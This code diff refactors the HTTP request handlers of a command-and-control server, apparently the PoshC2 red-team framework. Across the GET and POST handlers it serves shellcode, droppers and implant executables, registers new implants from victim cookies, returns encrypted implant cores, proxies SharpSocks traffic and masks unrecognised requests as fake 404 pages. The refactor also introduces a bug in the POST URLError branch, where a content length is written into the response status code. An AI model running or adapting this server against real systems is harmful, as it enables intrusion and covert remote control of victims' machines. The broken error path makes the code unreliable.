@@ -74,6 +74,11 @@ class MyHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
             """Respond to a GET request."""
+            response_content_len = None
+            response_code = 200
+            response_content_type = "text/html"  
+            response_content = None
+            
             logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
             new_implant_url = get_newimplanturl()
             self.cookieHeader = self.headers.get('Cookie')
@@ -96,148 +101,79 @@ class MyHandler(BaseHTTPRequestHandler):
             new_task = newTask(self.path)
 
             if new_task:
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(new_task)
+                response_content = new_task
 
             elif [ele for ele in sharplist if(ele in UriPath)]:
                 try:
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
                     r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
                     res = urlopen(r)
-                    sharpout = res.read()
-                    self.send_response(200)
-                    self.send_header("Content-type", "text/html")
-                    self.send_header("Connection", "close")
-                    self.send_header("Content-Length", len(sharpout))
-                    self.end_headers()
+                    sharpout = res.read()                  
+                    response_content_len = len(sharpout)
                     if (len(sharpout) > 0):
-                        self.wfile.write(sharpout)
+                        response_content = sharpout
                 except HTTPError as e:
-                    self.send_response(e.code)
-                    self.send_header("Content-type", "text/html")
-                    self.send_header("Connection", "close")
-                    self.end_headers()
+                    response_code = e.code
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                 except Exception as e:
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-                    print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
-                    print(Colours.RED + UriPath + Colours.END)
-                    self.send_response(404)
-                    self.send_header("Content-type", "text/html")
-                    self.end_headers()
+                    print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {UriPath}" + Colours.END)
+                    response_code = 404
                     HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                     if HTTPResponsePage:
-                        self.wfile.write(bytes(HTTPResponsePage, "utf-8"))
+                        response_content = bytes(HTTPResponsePage, "utf-8")
                     else:
-                        self.wfile.write(bytes(GET_404_Response, "utf-8"))
+                        response_content = bytes(GET_404_Response, "utf-8")
+
+            # server custom content
 
             elif ("%s_bs" % QuickCommandURI) in self.path:
-                filename = "%spayload.bat" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                response_content = open("%spayload.bat" % (PayloadsDirectory), 'rb').read()
 
             elif ("%s_rp" % QuickCommandURI) in self.path:
-                filename = "%spayload.txt" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = base64.b64encode(f.read())
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                content = open("%spayload.txt" % (PayloadsDirectory), 'rb').read()
+                response_content = base64.b64encode(content)
 
             elif ("%s_rg" % QuickCommandURI) in self.path:
-                filename = "%srg_sct.xml" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                response_content = open("%srg_sct.xml" % (PayloadsDirectory), 'rb').read()
 
             elif ("%ss/86/portal" % QuickCommandURI) in self.path:
-                filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                content = base64.b64encode(content)
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                content = open("%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
+                response_content = base64.b64encode(content)
 
             elif ("%ss/64/portal" % QuickCommandURI) in self.path:
-                filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                content = base64.b64encode(content)
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                content = open("%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
+                response_content = base64.b64encode(content)
 
             elif ("%sp/86/portal" % QuickCommandURI) in self.path:
-                filename = "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                content = base64.b64encode(content)
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                content = open("%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
+                response_content = base64.b64encode(content)
 
             elif ("%sp/64/portal" % QuickCommandURI) in self.path:
-                filename = "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                content = base64.b64encode(content)
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                content = open("%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory), 'rb').read()
+                response_content = base64.b64encode(content)
 
             elif ("%s_cs" % QuickCommandURI) in self.path:
-                filename = "%scs_sct.xml" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
-                self.wfile.write(content)
+                response_content = open("%scs_sct.xml" % (PayloadsDirectory), 'rb').read()
 
             elif ("%s_py" % QuickCommandURI) in self.path:
-                filename = "%saes.py" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                    content = "a" + "".join("{:02x}".format(c) for c in content)
-                self.send_response(200)
-                self.send_header("Content-type", "text/plain")
-                self.end_headers()
-                self.wfile.write(bytes(content, "utf-8"))
+                content = open("%saes.py" % (PayloadsDirectory), 'rb').read()
+                content = "a" + "".join("{:02x}".format(c) for c in content)
+                response_code = 200
+                response_content_type = "text/plain"
+                response_content = bytes(content, "utf-8")
 
             elif ("%s_ex86" % QuickCommandURI) in self.path:
-                filename = "%sPosh32.exe" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header("Content-type", "application/x-msdownload")
-                self.end_headers()
-                self.wfile.write(content)
+                response_content = open("%sPosh32.exe" % (PayloadsDirectory), 'rb').read()
+                response_code = 200
+                response_content_type = "application/x-msdownload"
 
-            elif ("%s_ex64" % QuickCommandURI) in self.path:
-                filename = "%sPosh64.exe" % (PayloadsDirectory)
-                with open(filename, 'rb') as f:
-                    content = f.read()
-                self.send_response(200)
-                self.send_header("Content-type", "application/x-msdownload")
-                self.end_headers()
-                self.wfile.write(content)
+            elif ("%s_ex64" % QuickCommandURI) in self.path:                
+                response_content = open("%sPosh64.exe" % (PayloadsDirectory), 'rb').read()
+                response_code = 200
+                response_content_type = "application/x-msdownload"
 
             # register new implant
             elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
@@ -271,11 +207,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     newImplant.save()
                     newImplant.display()
                     newImplant.autoruns()
-                    responseVal = encrypt(KEY, newImplant.SharpCore)
-                    self.send_response(200)
-                    self.send_header("Content-type", "text/html")
-                    self.end_headers()
-                    self.wfile.write(responseVal)
+                    response_content = encrypt(KEY, newImplant.SharpCore)
 
                 elif implant_type.startswith("Python"):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
@@ -286,12 +218,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
                     newImplant.save()
                     newImplant.display()
-                    responseVal = encrypt(KEY, newImplant.PythonCore)
-
-                    self.send_response(200)
-                    self.send_header("Content-type", "text/html")
-                    self.end_headers()
-                    self.wfile.write(responseVal)
+                    response_content = encrypt(KEY, newImplant.PythonCore)
                 else:
                     try:
                         cookieVal = (self.cookieHeader).replace("SessionID=", "")
@@ -306,39 +233,49 @@ class MyHandler(BaseHTTPRequestHandler):
                         newImplant.save()
                         newImplant.display()
                         newImplant.autoruns()
-                        responseVal = encrypt(KEY, newImplant.PSCore)
-                        self.send_response(200)
-                        self.send_header("Content-type", "text/html")
-                        self.end_headers()
-                        self.wfile.write(responseVal)
+                        response_content = encrypt(KEY, newImplant.PSCore)
                     except Exception as e:
                         print("Decryption error: %s" % e)
                         traceback.print_exc()
-                        self.send_response(404)
-                        self.send_header("Content-type", "text/html")
-                        self.end_headers()
+                        response_code = 404
                         HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                         if HTTPResponsePage:
-                            self.wfile.write(bytes(HTTPResponsePage, "utf-8"))
+                            response_content = bytes(HTTPResponsePage, "utf-8")
                         else:
-                            self.wfile.write(bytes(GET_404_Response, "utf-8"))
+                            response_content = bytes(GET_404_Response, "utf-8")
             else:
-                self.send_response(404)
-                self.send_header("Content-type", "text/html")
-                self.end_headers()
+                response_code = 404
                 HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                 if HTTPResponsePage:
-                    self.wfile.write(bytes(HTTPResponsePage, "utf-8"))
+                    response_content = bytes(HTTPResponsePage, "utf-8")
                 else:
-                    self.wfile.write(bytes(GET_404_Response, "utf-8"))
+
+                    response_content = bytes(GET_404_Response, "utf-8")
+
+            # send response
+            self.send_response(response_code)
+            self.send_header("Content-type", response_content_type)
+            if response_content_len is not None:
+                self.send_header("Connection", "close")
+                self.send_header("Content-Length", response_content_len)
+            self.end_headers()
+
+            if response_content is not None:
+                self.wfile.write(response_content)
+
         except Exception as e:
             if 'broken pipe' not in str(e).lower():
                 print_bad("Error handling GET request: " + str(e))
                 traceback.print_exc()
 
     def do_POST(self):
-        """Respond to a POST request."""
         try:
+            """Respond to a POST request."""
+            response_content_len = None
+            response_code = 200
+            response_content_type = "text/html"  
+            response_content = None
+
             self.server_version = ServerHeader
             self.sys_version = ""
             try:
@@ -376,47 +313,46 @@ class MyHandler(BaseHTTPRequestHandler):
                         r = Request("%s%s" % (SocksHost, UriPath), headers={'Cookie': '%s' % self.cookieHeader, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
                         res = urlopen(r, post_data)
                         sharpout = res.read()
-                        self.send_response(res.getcode())
-                        self.send_header("Content-type", "text/html")
-                        self.send_header("Content-Length", len(sharpout))
-                        self.end_headers()
+                        response_code = res.getcode()
+                        response_content_len = len(sharpout)
                         if (len(sharpout) > 0):
-                            self.wfile.write(sharpout)
+                            response_content = sharpout
                     except URLError as e:
                         try:
-                            self.send_response(res.getcode())
+                            response_code = res.getcode()
                         except:
-                            self.send_response(500)
-                        self.send_header("Content-type", "text/html")
+                            response_code = 500
                         try:
-                            self.send_header("Content-Length", len(sharpout))
+                            response_code = len(sharpout)
                         except:
-                            self.send_header("Content-Length", 0)
-                        self.end_headers()
+                            response_code = 0
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] URLError with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                     except Exception as e:
-                        self.send_response(res.getcode())
-                        self.send_header("Content-type", "text/html")
-                        self.send_header("Content-Length", len(sharpout))
-                        self.end_headers()
+                        response_code = res.getcode()
+                        response_content_len = len(sharpout)
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-                        print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
-                        print(Colours.RED + UriPath + Colours.END)
-                        self.send_response(404)
-                        self.send_header("Content-type", "text/html")
-                        self.end_headers()
+                        print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {UriPath}" + Colours.END)
+                        response_code = 404
                         HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                         if HTTPResponsePage:
-                            self.wfile.write(bytes(HTTPResponsePage, "utf-8"))
+                            response_content = bytes(HTTPResponsePage, "utf-8")
                         else:
-                            self.wfile.write(bytes(GET_404_Response, "utf-8"))
+                            response_content = bytes(GET_404_Response, "utf-8")
                 else:
-                    self.send_response(200)
-                    self.send_header("Content-type", "text/html")
-                    self.end_headers()
-                    self.wfile.write(default_response())
+                    response_content = default_response()
+
+                # send response
+                self.send_response(response_code)
+                self.send_header("Content-type", response_content_type)
+                if response_content_len is not None:
+                    self.send_header("Connection", "close")
+                    self.send_header("Content-Length", response_content_len)
+                self.end_headers()
+                if response_content is not None:
+                    self.wfile.write(response_content)
+
             except Exception as e:
                 print(Colours.RED + "Generic error in POST request!" + Colours.END)
                 print(Colours.RED + UriPath + Colours.END)
